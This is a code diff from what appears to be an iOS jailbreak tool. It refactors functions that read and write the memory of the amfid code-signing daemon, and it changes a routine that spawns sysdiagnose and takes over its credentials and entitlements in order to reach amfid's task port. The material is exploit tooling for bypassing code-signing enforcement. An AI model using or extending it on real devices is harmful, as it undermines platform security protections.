@@ -14,54 +14,7 @@
 #import "kernel_memory.h"
 #import "jbtools.h"
 #import "utils.h"
-
-static mach_port_t amfid_task_port;
-pthread_t exceptionThread;
-static mach_port_name_t AMFID_ExceptionPort = MACH_PORT_NULL;
-uint64_t origAMFID_MISVSACI = 0;
-uint64_t amfid_base;
-
-void init_amfid_mem(mach_port_t amfid_tp) {
-    amfid_task_port = amfid_tp;
-}
-
-void* AmfidRead(uint64_t addr, uint64_t len) {
-    kern_return_t ret;
-    vm_offset_t buf = 0;
-    mach_msg_type_number_t num = 0;
-    ret = mach_vm_read(amfid_task_port, addr, len, &buf, &num);
-    
-    if (ret != KERN_SUCCESS) {
-        printf("[-] amfid read failed (0x%llx)\n", addr);
-        return NULL;
-    }
-    uint8_t* outbuf = malloc(len);
-    memcpy(outbuf, (void*)buf, len);
-    mach_vm_deallocate(mach_task_self(), buf, num);
-    return outbuf;
-}
-
-void AmfidWrite_8bits(uint64_t addr, uint8_t val) {
-    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&val, 1);
-    if (err != KERN_SUCCESS) {
-        printf("[-] amfid write failed (0x%llx)\n", addr);
-    }
-}
-
-void AmfidWrite_32bits(uint64_t addr, uint32_t val) {
-    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&val, 4);
-    if (err != KERN_SUCCESS) {
-        printf("[-] amfid write failed (0x%llx)\n", addr);
-    }
-}
-
-
-void AmfidWrite_64bits(uint64_t addr, uint64_t val) {
-    kern_return_t err = mach_vm_write(amfid_task_port, addr, (vm_offset_t)&val, 8);
-    if (err != KERN_SUCCESS) {
-        printf("[-] amfid write failed (0x%llx)\n", addr);
-    }
-}
+#import "amfiutils.h"
 
 
 int find_amfid() {
@@ -84,25 +37,26 @@ int find_amfid() {
     return 1;
 }
 
-bool hijacksysdiagnose() {
+pid_t hijacksysdiagnose() {
     LOG("[sys] Hijacking sysdiagnose..");
-    // find sysdiagnose pid
+    // find sysdiagnose's pid
     pid_t syspid;
     char const *argv[] = {"sysdiagnose", NULL};
     posix_spawn(&syspid, "/usr/bin/sysdiagnose", NULL, NULL, argv, NULL);
+    // get the proc from syspid
     uint64_t sysproc = proc_of_pid(syspid);
     if(!ADDRISVALID(sysproc)) {
         LOG("[sys] ERR: sysdiagnose proc is invalid");
-        return false;
+        return 1;
     }
     LOG("[sys] Got sysdiagnose proc: 0x%llx", sysproc);
-    // grab its creds and entitlements
+    // grab sysdiagnose's creds and entitlements
     int ents = CredsTool(sysproc, 0, YES, NO);
     if(ents != 0) {
-        return false;
+        return 1;
     }
     LOG("[sys] Got sysdiagnose creds, returning..");
-    return true;
+    return syspid;
 }
 
 int amfidestroyer() {
@@ -110,11 +64,11 @@ int amfidestroyer() {
     mach_port_t amfid_task_port = MACH_PORT_NULL;
     // Get amfid's pid
     pid_t amfipid = find_amfid();
-    if(amfipid == 1) return 1; // find_amfid() returns "1" if it fails
+    if(amfipid == 1) return 1; // find_amfid() returns 1 if it fails
     LOG("[amfid] Got amfid pid: %d", amfipid);
     // hijack sysdiagnose so we can get the amfi task port
-    bool sys = hijacksysdiagnose();
-    if(sys != true) {
+    pid_t syspid = hijacksysdiagnose();
+    if(syspid == 1) { // hijacksysdiagnose returns 1 if it fails
         LOG("[amfid] ERR: Couldn't get sysdiagnose creds");
         CredsTool(0, 1, NO, NO);
         return 1;
@@ -132,6 +86,7 @@ int amfidestroyer() {
     init_amfid_mem(amfid_task_port);
     
     
-    
+    // clean up
+    kill(syspid, SIGKILL);
     return 0;
 }
